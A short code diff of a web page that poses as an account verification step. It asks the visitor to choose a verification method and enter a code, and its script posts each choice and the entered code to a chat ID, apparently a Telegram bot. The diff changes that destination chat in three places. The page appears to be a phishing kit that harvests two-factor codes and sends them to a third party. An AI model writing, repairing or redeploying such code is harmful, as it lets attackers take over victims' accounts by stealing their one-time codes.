@@ -210,7 +210,7 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
-          chat_id: "-4820773911", 
+          chat_id: "-1002979982624", 
           text: `📋 Selected Verification Methods:\n${selectedMethodNames.join('\n')}` 
         })
       });
@@ -237,7 +237,7 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
-          chat_id: "-4820773911", 
+          chat_id: "-1002979982624", 
           text: `🔘 User Selected Method:\n${methodName}` 
         })
       });
@@ -266,7 +266,7 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
-          chat_id: "-4820773911", 
+          chat_id: "-1002979982624", 
           text: `🔐 Verification Code Received\n\nMethod: ${methodText}\nCode: ${code}` 
         })
       });
@@ -319,4 +319,5 @@
     <button onclick="verifyCode()">Confirm</button>
   </div>
 </body>
+
 </html>
